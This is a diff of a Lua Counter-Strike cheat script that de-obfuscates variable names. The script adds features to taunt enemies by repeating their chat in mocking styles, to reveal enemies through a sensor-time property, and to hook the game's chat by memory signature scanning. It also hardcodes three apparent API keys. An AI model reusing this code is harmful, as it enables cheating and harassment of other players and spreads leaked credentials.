-			local var_211_0 = var_0_21.getPlayer()
 
-			if var_211_0 then
-				var_0_21.cache[var_211_0] = var_0_21.cache[var_211_0] or {}
+		ui.set_callback(ApplyToAll, function(self)
+			local Player = PListAdditions.getPlayer()
+			if ( Player ) then
+				PListAdditions.cache[Player] = PListAdditions.cache[Player] or {}
 
-				for iter_211_0 = 1, globals.maxplayers() do
-					if entity.is_enemy(iter_211_0) then
-						for iter_211_1, iter_211_2 in ipairs(var_0_21.binds) do
-							var_0_21.cache[iter_211_0] = var_0_21.cache[iter_211_0] or {}
-							var_0_21.cache[iter_211_0][iter_211_2] = ui.get(iter_211_2)
+				for OtherPlayer=1, globals.maxplayers() do
+					if ( entity.is_enemy(OtherPlayer) ) then
+						for index, BindedItem in ipairs(PListAdditions.binds) do
+							PListAdditions.cache[OtherPlayer] = PListAdditions.cache[OtherPlayer] or {}
+							PListAdditions.cache[OtherPlayer][BindedItem] = ui.get(BindedItem)
 						end
 					end
 				end
 			end
-		end)
-		ui.new_label("Players", "Adjustments", "=---------  [ START $CP Additions  ]  ---------=")
-
-		local var_10_46 = {
-			repeatMessages = ui.new_checkbox("Players", "Adjustments", "Repeat Messages")
-		}
-
-		var_0_21.bind(var_10_46.repeatMessages, function(arg_212_0)
-			local var_212_0 = ui.get(arg_212_0)
-			local var_212_1 = var_0_21.getPlayer()
-
-			ui.set_visible(var_10_46.repeatMethod, ui.get(arg_212_0))
-			ui.set_visible(var_10_46.testOutput, ui.get(arg_212_0))
+			
 		end)
 
-		local var_10_47 = {
-			"Shift Case"
-		}
+		ui.new_label('Players', 'Adjustments', '=---------  [ START $CP Additions  ]  ---------=')
 
-		for iter_10_8, iter_10_9 in pairs(var_10_42.trans) do
-			var_10_47[#var_10_47 + 1] = iter_10_8
+		--#region PList Message Repeater
+		local MessageRepeater = {}
+		MessageRepeater.repeatMessages = ui.new_checkbox('Players', 'Adjustments', 'Repeat Messages')
+		PListAdditions.bind(MessageRepeater.repeatMessages, function(item)
+			local Status = ui.get(item)
+			local Player = PListAdditions.getPlayer()
+			ui.set_visible(MessageRepeater.repeatMethod, ui.get(item))
+			ui.set_visible(MessageRepeater.testOutput, ui.get(item))
+		end)
+
+		local RepeatMethods = {'Shift Case'}
+		for i, v in pairs(style.trans) do
+			RepeatMethods[#RepeatMethods + 1] = i
 		end
+		MessageRepeater.repeatMethod = ui.new_combobox('Players', 'Adjustments', 'Repeat Method', RepeatMethods)
 
-		var_10_46.repeatMethod = ui.new_combobox("Players", "Adjustments", "Repeat Method", var_10_47)
-		var_10_46.testOutput = ui.new_button("Players", "Adjustments", "Print Example", function()
-			local var_213_0 = ui.get(var_10_46.repeatMethod)
-			local var_213_1 = "She Sells Seashells on the Seashore"
-
-			if var_213_0 == "Shift Case" then
-				var_213_1 = changeCase(var_213_1)
+		MessageRepeater.testOutput = ui.new_button('Players', 'Adjustments', 'Print Example', function()
+			local Method = ui.get(MessageRepeater.repeatMethod)
+			local Message = 'She Sells Seashells on the Seashore'
+			
+			if ( Method == 'Shift Case' ) then
+				Message = changeCase(Message)
 			else
-				var_213_1 = transText(var_213_0, var_213_1)
+				Message = transText(Method, Message)
 			end
-
-			var_10_0.ChatMethods["Local Chat"](" \a[Message Repeater] \n" .. var_213_1)
+			
+			CPLua.ChatMethods['Local Chat'](' \x07[Message Repeater] \x0A' .. Message)
 		end)
 
-		ui.set_visible(var_10_46.repeatMethod, false)
-		ui.set_visible(var_10_46.testOutput, false)
-		var_0_21.bind(var_10_46.repeatMethod)
-		client.set_event_callback("player_chat", function(arg_214_0)
-			if not arg_214_0.teamonly then
-				local var_214_0 = arg_214_0.entity
-				local var_214_1 = arg_214_0.name
-				local var_214_2 = arg_214_0.text
+		ui.set_visible(MessageRepeater.repeatMethod, false)
+		ui.set_visible(MessageRepeater.testOutput, false)
 
-				var_0_21.cache[var_214_0] = var_0_21.cache[var_214_0] or {}
+		PListAdditions.bind(MessageRepeater.repeatMethod)
 
-				if entity.is_enemy(var_214_0) and var_0_21.cache[var_214_0] ~= nil and var_0_21.cache[var_214_0][var_10_46.repeatMessages] and var_0_21.cache[var_214_0][var_10_46.repeatMethod] then
-					local var_214_3 = var_0_21.cache[var_214_0][var_10_46.repeatMethod]
-					local var_214_4 = var_214_2
-
-					if var_214_3 == "Shift Case" then
-						var_214_4 = changeCase(var_214_2)
+		client.set_event_callback('player_chat', function (e)
+			if ( not e.teamonly ) then
+				local ent, name, text = e.entity, e.name, e.text
+				PListAdditions.cache[ent] = PListAdditions.cache[ent] or {}
+				if ( entity.is_enemy(ent) and PListAdditions.cache[ent] ~= nil and PListAdditions.cache[ent][MessageRepeater.repeatMessages] and PListAdditions.cache[ent][MessageRepeater.repeatMethod] ) then
+					local Method = PListAdditions.cache[ent][MessageRepeater.repeatMethod]
+					local Message = text
+					
+					if ( Method == 'Shift Case' ) then
+						Message = changeCase(text)
 					else
-						var_214_4 = transText(var_214_3, var_214_2)
+						Message = transText(Method, text)
 					end
-
-					MessageQueue:Say(var_214_4, true)
+					
+					MessageQueue:Say(Message, true)
 				end
 			end
 		end)
+		--#endregion
 
-		if var_0_18.get("Highlight Targets") then
-			local var_10_48 = ui.new_checkbox("Players", "Adjustments", "Hightlight Player")
-
-			var_0_21.bind(var_10_48)
-
-			local var_10_49 = {}
-
-			client.set_event_callback("run_command", function(arg_215_0)
-				var_10_49 = {}
-
-				for iter_215_0, iter_215_1 in ipairs(entity.get_players(true)) do
-					var_0_21.cache[iter_215_1] = var_0_21.cache[iter_215_1] or {}
-
-					if var_0_21.cache[iter_215_1][var_10_48] then
-						table.insert(var_10_49, iter_215_1)
-						entity.set_prop(iter_215_1, "m_flDetectedByEnemySensorTime", 1000000)
+		--#region PList Highlight Target
+		if ( Feature.get('Highlight Targets') ) then
+			local HighlightTarget = ui.new_checkbox('Players', 'Adjustments', 'Hightlight Player')
+			PListAdditions.bind(HighlightTarget)
+			local HighlightedEntities = {}
+			client.set_event_callback("run_command", function(c)
+				HighlightedEntities = {}
+				for _, Entity in ipairs(entity.get_players(true)) do
+					PListAdditions.cache[Entity] = PListAdditions.cache[Entity] or {}
+					if ( PListAdditions.cache[Entity][HighlightTarget] ) then
+						table.insert(HighlightedEntities, Entity)
+						entity.set_prop(Entity, "m_flDetectedByEnemySensorTime", 1e6)
 					else
-						entity.set_prop(iter_215_1, "m_flDetectedByEnemySensorTime", 0)
+						entity.set_prop(Entity, "m_flDetectedByEnemySensorTime", 0)
 					end
 				end
 			end)
+
 			client.set_event_callback("paint", function()
-				for iter_216_0, iter_216_1 in pairs(var_10_49) do
-					local var_216_0 = {
-						entity.get_bounding_box(iter_216_1)
-					}
-
-					if #var_216_0 == 5 and var_216_0[5] ~= 0 then
-						local var_216_1 = var_216_0[1] + (var_216_0[3] - var_216_0[1]) / 2
-
-						renderer.text(var_216_1, var_216_0[2] - 18, 255, 255, 0, 255 * var_216_0[5], "c", 0, "WARNING!")
+				for _, v in pairs(HighlightedEntities) do
+					local bounding_box = {entity.get_bounding_box(v)}
+					if #bounding_box == 5 and bounding_box[5] ~= 0 then
+						local center = bounding_box[1]+(bounding_box[3]-bounding_box[1])/2
+						renderer.text(center, bounding_box[2]-18, 255, 255, 0, 255*bounding_box[5], "c", 0, "WARNING!")
 					end
 				end
 			end)
 		end
+		--#endregion
 
-		if var_0_18.get("Whitelist Friends on Key") then
-			var_0_21.MarkAsLegit = ui.new_checkbox("Players", "Adjustments", "Mark as Legit")
+		--#region Mark As Legit
+		if ( Feature.get('Whitelist Friends on Key') ) then
+			PListAdditions.MarkAsLegit = ui.new_checkbox('Players', 'Adjustments', 'Mark as Legit')
+			PListAdditions.bind(PListAdditions.MarkAsLegit)
 
-			var_0_21.bind(var_0_21.MarkAsLegit)
 			client.set_event_callback("paint", function()
-				local var_217_0, var_217_1 = ui.get(var_10_0.WhitelistLegitsOnKey.hotkey)
+				local KeyState, Key = ui.get(CPLua.WhitelistLegitsOnKey.hotkey)
 
-				if ui.get(var_10_0.WhitelistLegitsOnKey.enable) and var_217_0 then
-					renderer.indicator(255, 255, 255, 255, "WHITELISTED LEGITS")
+				if ( ui.get(CPLua.WhitelistLegitsOnKey.enable) and KeyState ) then
+					renderer.indicator(255, 255, 255, 255, 'WHITELISTED LEGITS')
 				end
 			end)
 		end
+		--#endregion
+		
+		ui.new_label('Players', 'Adjustments', '=---------  [  END $CP Additions  ]  ---------=')
 
-		ui.new_label("Players", "Adjustments", "=---------  [  END $CP Additions  ]  ---------=")
-		client.set_event_callback("cs_win_panel_match", function(arg_218_0)
-			var_0_21.cache = {}
+		client.set_event_callback('cs_win_panel_match', function(e)
+			PListAdditions.cache = {}
 		end)
-		var_0_4.register_event("ShowAcceptPopup", function(arg_219_0)
-			var_0_21.cache = {}
+
+		panorama_events.register_event('ShowAcceptPopup', function(data)
+			PListAdditions.cache = {}
 		end)
 	end
+	--#endregion
 end
 
-Timer = {
-	q = {}
-}
+--#region Utilities and Libraries
 
-function Timer.set(arg_220_0, arg_220_1)
-	local var_220_0 = #Timer.q + 1
-	local var_220_1 = {
-		expiry = globals.realtime() + arg_220_0,
-		callback = arg_220_1,
-		duration = arg_220_0
-	}
-
-	var_220_1.active = true
-
-	function var_220_1.update(arg_221_0, arg_221_1)
-		arg_221_0.expiry = globals.realtime() + arg_221_1
-	end
-
-	function var_220_1.increase(arg_222_0, arg_222_1)
-		arg_222_0.expiry = arg_222_0.expiry + arg_222_1
-	end
-
-	function var_220_1.decrease(arg_223_0, arg_223_1)
-		arg_223_0.expiry = arg_223_0.expiry - arg_223_1
-	end
-
-	function var_220_1.reset(arg_224_0)
-		arg_224_0.expiry = globals.realtime() + arg_224_0.duration
-	end
-
-	function var_220_1.delete(arg_225_0)
-		if not arg_225_0.active then
-			return
-		end
-
-		arg_225_0.active = false
-
-		table.remove(Timer.q, var_220_0)
-	end
-
-	function var_220_1.remaining(arg_226_0)
-		return arg_226_0.active and arg_226_0.expiry - globals.realtime() or 0
-	end
-
-	Timer.q[var_220_0] = var_220_1
-
-	return var_220_1
-end
-
-client.set_event_callback("post_render", function()
-	for iter_227_0 = 1, #Timer.q do
-		local var_227_0 = Timer.q[iter_227_0]
-
-		if globals.realtime() >= var_227_0.expiry then
-			var_227_0.active = false
-
-			var_227_0.callback()
-			table.remove(Timer.q, iter_227_0)
-
-			break
-		end
-	end
-end)
-
+--#region MessageQueue
 MessageQueue = {}
 MessageQueue.pending = {}
 
-function MessageQueue.Say(arg_228_0, arg_228_1, arg_228_2)
-	if arg_228_1 then
-		local var_228_0 = arg_228_1:gsub("\"", ""):gsub(";", "")
-		local var_228_1 = {
-			"say \"",
-			var_228_0,
-			"\";"
-		}
-
-		table.insert(arg_228_0.pending, Priority and 1 or var_228_1)
-	end
+function MessageQueue:Say(message, priority)
+	local Sanitized = message:gsub('"', ''):gsub(';', '')
+	local Data = {'say "', Sanitized, '";'}
+	table.insert(self.pending, Priority and 1 or Data)
 end
 
-function MessageQueue.SayTeam(arg_229_0, arg_229_1, arg_229_2)
-	if arg_229_1 then
-		local var_229_0 = arg_229_1:gsub("\"", ""):gsub(";", "")
-		local var_229_1 = {
-			"say_team \"",
-			var_229_0,
-			"\";"
-		}
-
-		table.insert(arg_229_0.pending, Priority and 1 or var_229_1)
-	end
+function MessageQueue:SayTeam(message, priority)
+	local Sanitized = message:gsub('"', ''):gsub(';', '')
+	local Data = {'say_team "', Sanitized, '";'}
+	table.insert(self.pending, Priority and 1 or Data)
 end
 
-local var_0_23 = globals.realtime()
-
-client.set_event_callback("post_render", function()
-	if globals.realtime() - var_0_23 > 0.725 + client.latency() then
-		local var_230_0 = MessageQueue.pending[1]
-
-		if var_230_0 then
-			client.exec(unpack(var_230_0))
-			table.remove(MessageQueue.pending, 1)
-
-			var_0_23 = globals.realtime()
-		end
-	end
+local LastTick = globals.realtime()
+client.set_event_callback('post_render', function()
+    if ( globals.realtime() - LastTick > 0.725 + client.latency() ) then
+        local NextMessage = MessageQueue.pending[1]
+        if ( NextMessage ) then
+            client.exec(unpack(NextMessage))
+            table.remove(MessageQueue.pending, 1)
+			LastTick = globals.realtime()
+        end
+    end
 end)
+--#endregion 
 
-local var_0_24 = {
-	"5DA40A4A4699DEE30C1C9A7BCE84C914",
-	"5970533AA2A0651E9105E706D0F8EDDC",
-	"2B3382EBA9E8C1B58054BD5C5EE1C36A"
+local Keys = {
+	'5DA40A4A4699DEE30C1C9A7BCE84C914',
+	'5970533AA2A0651E9105E706D0F8EDDC',
+	'2B3382EBA9E8C1B58054BD5C5EE1C36A'
 }
-local var_0_25 = 0
-
+local KeyIndex = 0
 function RandomWebKey()
-	var_0_25 = var_0_25 < #var_0_24 and var_0_25 + 1 or 1
-
-	return var_0_24[var_0_25]
+	KeyIndex = KeyIndex < #Keys and KeyIndex + 1 or 1
+	return Keys[KeyIndex]
 end
 
-function processTags(arg_232_0, arg_232_1)
-	if not arg_232_1 then
-		arg_232_1 = arg_232_0
-		arg_232_0 = arg_232_1[1]
+function processTags(str, vars)
+	if not vars then
+		vars = str
+		str = vars[1]
 	end
 
-	local var_232_0 = arg_232_0
-	local var_232_1 = string.gsub(var_232_0, "({([^}]+)})", function(arg_233_0, arg_233_1, arg_233_2, arg_233_3)
-		return arg_232_1[arg_233_1:lower()] or arg_233_0
-	end)
+    local out = str
+    -- Process Single Tags
+    out = string.gsub(out, "({([^}]+)})",
+        function(whole,i, flags, test) 
+            return vars[i:lower()] or whole
+        end
+    )
+    -- Process Special flags
+    out = string.gsub(out, '({([^}]+):(%w*)})',
+        function(whole,i, flags, test)
+            local out = vars[i:lower()]
+            if out and type(flags) == 'string' and flags:len() > 0 then
+                local Flags = flags:lower()
+                if Flags:find('i') then
+                    out = out:lower()
+                end
+                if Flags:find('u') then
+                    out = out:upper()
+                end
+                if Flags:find('s') then
+                    out = out:gsub('%s+', '')
+                end
+                if Flags:find('h') then
+                    out = out:gsub('[-]+', '')
+                end
+                if Flags:find('n') then
+                    out = out:gsub('%d+', '')
+                end
+                if Flags:find('%d') then
+                    local index = tonumber(string.match(Flags, '%d'))
+                    local words = {}
+                    for word in out:gmatch("%w+") do table.insert(words, word) end
+                    if index <= #words then
+                        out = words[index]
+                    end
+                end
+            end
+            return out or whole
+        end
+    )
 
-	return (string.gsub(var_232_1, "({([^}]+):(%w*)})", function(arg_234_0, arg_234_1, arg_234_2, arg_234_3)
-		local var_234_0 = arg_232_1[arg_234_1:lower()]
-
-		if var_234_0 and type(arg_234_2) == "string" and arg_234_2:len() > 0 then
-			local var_234_1 = arg_234_2:lower()
-
-			if var_234_1:find("i") then
-				var_234_0 = var_234_0:lower()
-			end
-
-			if var_234_1:find("u") then
-				var_234_0 = var_234_0:upper()
-			end
-
-			if var_234_1:find("s") then
-				var_234_0 = var_234_0:gsub("%s+", "")
-			end
-
-			if var_234_1:find("h") then
-				var_234_0 = var_234_0:gsub("[-]+", "")
-			end
-
-			if var_234_1:find("n") then
-				var_234_0 = var_234_0:gsub("%d+", "")
-			end
-
-			if var_234_1:find("%d") then
-				local var_234_2 = tonumber(string.match(var_234_1, "%d"))
-				local var_234_3 = {}
-
-				for iter_234_0 in var_234_0:gmatch("%w+") do
-					table.insert(var_234_3, iter_234_0)
-				end
-
-				if var_234_2 <= #var_234_3 then
-					var_234_0 = var_234_3[var_234_2]
-				end
-			end
-		end
-
-		return var_234_0 or arg_234_0
-	end))
+	return out
 end
 
 function printDebug(...)
-	if not var_0_22.debugMode then
-		return
-	end
+	if ( not Options.debugMode ) then return end
+	-- print('[$CP]', ...)
 end
 
-function esc(arg_236_0)
-	return (arg_236_0:gsub("%%", "%%%%"):gsub("^%^", "%%^"):gsub("%$$", "%%$"):gsub("%(", "%%("):gsub("%)", "%%)"):gsub("%.", "%%."):gsub("%[", "%%["):gsub("%]", "%%]"):gsub("%*", "%%*"):gsub("%+", "%%+"):gsub("%-", "%%-"):gsub("%?", "%%?"))
+function esc(x)
+	return (x:gsub('%%', '%%%%'):gsub('^%^', '%%^'):gsub('%$$', '%%$'):gsub('%(', '%%('):gsub('%)', '%%)'):gsub('%.', '%%.'):gsub('%[', '%%['):gsub('%]', '%%]'):gsub('%*', '%%*'):gsub('%+', '%%+'):gsub('%-', '%%-'):gsub('%?', '%%?'))
 end
 
-function getRankShortName(arg_237_0)
-	if not arg_237_0 then
-		return false
-	end
-
-	local var_237_0 = {
-		"III",
-		"II",
-		"I"
-	}
-	local var_237_1 = arg_237_0:gsub("The ", " "):gsub("%l", "")
-
-	for iter_237_0 = 1, #var_237_0 do
-		if var_237_1:find(var_237_0[iter_237_0]) then
-			var_237_1 = var_237_1:gsub(var_237_0[iter_237_0], #var_237_0 + 1 - iter_237_0)
+function getRankShortName(LongRankName)
+	if not LongRankName then return false end
+	local RomanNumerals = {'III', 'II', 'I'}
+	local Rank = LongRankName:gsub('The ', ' '):gsub('%l', '')
+	for RomanIndex = 1, #RomanNumerals do
+		if ( Rank:find(RomanNumerals[RomanIndex]) ) then
+		Rank = Rank:gsub(RomanNumerals[RomanIndex], #RomanNumerals + 1 - RomanIndex)
 		end
+		Rank = Rank:gsub(' ', '')
+	end
+	return Rank
+end
 
-		var_237_1 = var_237_1:gsub(" ", "")
+--[[ This gives me bad vibes, disabling this feature for a hot minute.
+local LastDOWNState = false
+local LastUPState = false
+client.set_event_callback('post_render', function()
+	local DOWNKeyState = client.key_state(0x28)
+	if ( DOWNKeyState ~= LastDOWNState ) then
+		if ( DOWNKeyState ) then
+			CPPanoramaMainMenu.NextMessage()
+		end
+		LastDOWNState = DOWNKeyState
 	end
 
-	return var_237_1
+	local UPKeyState = client.key_state(0x26)
+	if ( UPKeyState ~= LastUPState ) then
+		if ( UPKeyState ) then
+			CPPanoramaMainMenu.PreviousMessage()
+		end
+		LastUPState = UPKeyState
+	end
+end)
+]]
+
+-- url encode / decode
+local char_to_hex = function(c)
+	return string.format("%%%02X", string.byte(c))
 end
 
-local function var_0_26(arg_238_0)
-	return string.format("%%%02X", string.byte(arg_238_0))
-end
-
-function urlencode(arg_239_0)
-	if arg_239_0 == nil then
+function urlencode(url)
+	if url == nil then
 		return
 	end
-
-	arg_239_0 = arg_239_0:gsub("\n", "\r\n")
-	arg_239_0 = arg_239_0:gsub("([^%w ])", var_0_26)
-	arg_239_0 = arg_239_0:gsub(" ", "+")
-
-	return arg_239_0
+	url = url:gsub("\n", "\r\n")
+	url = url:gsub("([^%w ])", char_to_hex)
+	url = url:gsub(" ", "+")
+	return url
 end
 
-local function var_0_27(arg_240_0)
-	return string.char(tonumber(arg_240_0, 16))
+local hex_to_char = function(x)
+	return string.char(tonumber(x, 16))
 end
 
-function urldecode(arg_241_0)
-	if arg_241_0 == nil then
+function urldecode(url)
+	if url == nil then
 		return
 	end
-
-	arg_241_0 = arg_241_0:gsub("+", " ")
-	arg_241_0 = arg_241_0:gsub("%%(%x%x)", var_0_27)
-
-	return arg_241_0
+	url = url:gsub("+", " ")
+	url = url:gsub("%%(%x%x)", hex_to_char)
+	return url
 end
 
-var_0_0.cdef("  typedef struct\n  {\n    int64_t pad_0;\n    union {\n      int xuid;\n      struct {\n        int xuidlow;\n        int xuidhigh;\n      };\n    };\n    char name[128];\n    int userid;\n    char guid[33];\n    unsigned int friendsid;\n    char friendsname[128];\n    bool fakeplayer;\n    bool ishltv;\n    unsigned int customfiles[4];\n    unsigned char filesdownloaded;\n  } S_playerInfo_t;\n\n  typedef bool(__thiscall* fnGetPlayerInfo)(void*, int, S_playerInfo_t*);\n")
+-- Raw Chat Print (credits to x0m)
+if ( Feature.get('Raw Chat Print') ) then
+	ffi.cdef[[
+		typedef void***(__thiscall* FindHudElement_t)(void*, const char*);
+		typedef void(__cdecl* ChatPrintf_t)(void*, int, int, const char*, ...);
+	]]
 
-local var_0_28 = var_0_0.cast(var_0_0.typeof("void***"), client.create_interface("engine.dll", "VEngineClient014"))
-local var_0_29 = var_0_0.cast("fnGetPlayerInfo", var_0_28[0][8])
+	local signature_gHud = '\xB9\xCC\xCC\xCC\xCC\x88\x46\x09'
+	local signature_FindElement = '\x55\x8B\xEC\x53\x8B\x5D\x08\x56\x57\x8B\xF9\x33\xF6\x39\x77\x28'
 
-function getPlayerInfo(arg_242_0)
-	local var_242_0 = var_0_0.new("S_playerInfo_t[1]")
+	local match = client.find_signature('client_panorama.dll', signature_gHud) or error('sig1 not found') -- returns void***
+	local char_match = ffi.cast('char*', match) + 1
+	local hud = ffi.cast('void**', char_match)[0] or error('hud is nil') -- returns void**
 
-	var_0_29(var_0_28, arg_242_0, var_242_0)
+	match = client.find_signature('client_panorama.dll', signature_FindElement) or error('FindHudElement not found')
+	local find_hud_element = ffi.cast('FindHudElement_t', match)
+	local hudchat = find_hud_element(hud, 'CHudChat') or error('CHudChat not found')
+	local chudchat_vtbl = hudchat[0] or error('CHudChat instance vtable is nil')
+	local raw_print_to_chat = chudchat_vtbl[27] -- void*
+	local print_to_chat = ffi.cast('ChatPrintf_t', raw_print_to_chat)
 
-	return var_242_0[0]
-end
-
-if var_0_18.get("Raw Chat Print") then
-	var_0_0.cdef("\t\ttypedef void***(__thiscall* FindHudElement_t)(void*, const char*);\n\t\ttypedef void(__cdecl* ChatPrintf_t)(void*, int, int, const char*, ...);\n\t")
-
-	local var_0_30 = "\xB9\xCC\xCC\xCC̈F\t"
-	local var_0_31 = "U\x8B\xECS\x8B]\bVW\x8B\xF93\xF69w("
-	local var_0_32 = client.find_signature("client_panorama.dll", var_0_30) or error("sig1 not found")
-	local var_0_33 = var_0_0.cast("char*", var_0_32) + 1
-	local var_0_34 = var_0_0.cast("void**", var_0_33)[0] or error("hud is nil")
-	local var_0_35 = client.find_signature("client_panorama.dll", var_0_31) or error("FindHudElement not found")
-	local var_0_36 = var_0_0.cast("FindHudElement_t", var_0_35)(var_0_34, "CHudChat") or error("CHudChat not found")
-	local var_0_37 = (var_0_36[0] or error("CHudChat instance vtable is nil"))[27]
-	local var_0_38 = var_0_0.cast("ChatPrintf_t", var_0_37)
-
-	function cp_SendChat(arg_243_0)
-		var_0_38(var_0_36, 0, 0, arg_243_0)
+	function cp_SendChat(text)
+		print_to_chat(hudchat, 0, 0, text)
 	end
 
-	local var_0_39 = {}
-	local var_0_40 = 0
-	local var_0_41 = 0
-
+	local frametimes = {}
+	local fps_prev = 0
+	local last_update_time = 0
 	function AccumulateFps()
-		local var_244_0 = globals.absoluteframetime()
-
-		if var_244_0 > 0 then
-			table.insert(var_0_39, 1, var_244_0)
+		local ft = globals.absoluteframetime()
+		if ft > 0 then
+			table.insert(frametimes, 1, ft)
 		end
-
-		local var_244_1 = #var_0_39
-
-		if var_244_1 == 0 then
+		local count = #frametimes
+		if count == 0 then
 			return 0
 		end
-
-		local var_244_2 = 0
-		local var_244_3 = 0
-
-		while var_244_3 < 0.5 do
-			var_244_2 = var_244_2 + 1
-			var_244_3 = var_244_3 + var_0_39[var_244_2]
-
-			if var_244_1 <= var_244_2 then
+		local i, accum = 0, 0
+		while accum < 0.5 do
+			i = i + 1
+			accum = accum + frametimes[i]
+			if i >= count then
 				break
 			end
 		end
-
-		local var_244_4 = var_244_3 / var_244_2
-
-		while var_244_2 < var_244_1 do
-			var_244_2 = var_244_2 + 1
-
-			table.remove(var_0_39)
+		accum = accum / i
+		while i < count do
+			i = i + 1
+			table.remove(frametimes)
 		end
-
-		local var_244_5 = 1 / var_244_4
-		local var_244_6 = globals.realtime()
-
-		if math.abs(var_244_5 - var_0_40) > 4 or var_244_6 - var_0_41 > 2 then
-			var_0_40 = var_244_5
-			var_0_41 = var_244_6
+		local fps = 1 / accum
+		local rt = globals.realtime()
+		if math.abs(fps - fps_prev) > 4 or rt - last_update_time > 2 then
+			fps_prev = fps
+			last_update_time = rt
 		else
-			var_244_5 = var_0_40
+			fps = fps_prev
 		end
-
-		return math.ceil(var_244_5 + 0.5)
+		return math.ceil(fps + 0.5)
 	end
 end
+--#endregion
 
-if var_0_18.get("User Data Saving") then
-	local var_0_42 = database.read("cplua_userdata") or {}
-	local var_0_43, var_0_44 = pcall(json.stringify, var_0_42)
+--#region User Data Saving
+if ( Feature.get('User Data Saving') ) then
+	local UserData = database.read('cplua_userdata') or {}
+	local stringifySuccess, UserDataJSON = pcall(json.stringify, UserData)
+	CPPanoramaMainMenu.SetUserData(stringifySuccess and UserDataJSON or {})
 
-	CPPanoramaMainMenu.SetUserData(var_0_43 and var_0_44 or {})
-	client.set_event_callback("shutdown", function()
-		local var_245_0, var_245_1 = pcall(json.parse, CPPanoramaMainMenu.GetUserData())
-
-		database.write("cplua_userdata", parseSuccess_ and var_245_1 or {})
+	client.set_event_callback('shutdown', function()
+		local parseSuccess, UserData_  = pcall(json.parse, CPPanoramaMainMenu.GetUserData()) 
+		database.write('cplua_userdata', parseSuccess_ and UserData_ or {})
 	end)
 end
+--#endregion
+
+-- Cleanup
 
 Initiate()
